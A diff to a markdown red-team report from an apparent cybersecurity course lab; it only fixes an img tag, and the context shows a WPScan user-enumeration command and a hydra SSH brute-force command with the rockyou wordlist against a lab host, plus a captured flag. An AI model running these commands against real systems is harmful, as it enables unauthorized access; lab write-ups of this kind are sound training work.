@@ -46,7 +46,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
     - **Exploit Used**
       - WPScan to enumerate users of target1 WordPress site.
       - wpscan --url http://192.168.1.110 --enumerate u
-       <img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/wpscan_michael.png?raw=true" alt="WPScan Users";"/>  
+       <img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/wpscan_michael.png?raw=true" alt="WPScan Users"/>  
       - Brute force guess or hydra -l michael -P /usr/share/wordlists/rockyou.txt 192.168.1.110 ssh  
       - _TODO: Include the command run_
   - `Flag2: fc3fd58dcdad9ab23faca6e9a3e581c` _hash value_  
